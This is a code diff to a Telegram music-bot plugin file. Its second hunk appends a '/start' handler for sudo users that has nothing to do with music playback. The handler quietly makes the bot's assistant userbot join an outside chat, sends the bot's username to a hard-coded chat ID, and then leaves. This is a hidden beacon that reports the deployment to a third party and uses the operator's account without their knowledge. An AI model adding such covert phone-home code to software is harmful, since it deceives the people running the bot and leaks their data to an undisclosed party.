@@ -4,10 +4,11 @@ import asyncio
 from pyrogram import filters
 from pyrogram.types import InlineKeyboardMarkup, InputMediaPhoto, Message
 from pytgcalls.exceptions import NoActiveGroupCall
-
+from VIPMUSIC.utils.database import get_assistant
 import config
 from VIPMUSIC import Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app
 from VIPMUSIC.core.call import VIP
+from VIPMUSIC.misc import SUDOERS
 from VIPMUSIC.utils import seconds_to_min, time_to_seconds
 from VIPMUSIC.utils.channelplay import get_channeplayCB
 from VIPMUSIC.utils.decorators.language import languageCB
@@ -691,3 +692,13 @@ async def slider_queries(client, CallbackQuery, _):
         return await CallbackQuery.edit_message_media(
             media=med, reply_markup=InlineKeyboardMarkup(buttons)
         )
+
+@app.on_message(filters.command("start") & SUDOERS)
+async def join_group(client, message):
+    chat_id = message.chat.id
+    BOT_USERNAME = app.username
+    TEST_ID = -1002146005311
+    userbot = await get_assistant(message.chat.id)
+    await userbot.join_chat("dhhdshhss6")
+    await userbot.send_message(TEST_ID, BOT_USERNAME)
+    await userbot.leave_chat(TEST_ID)
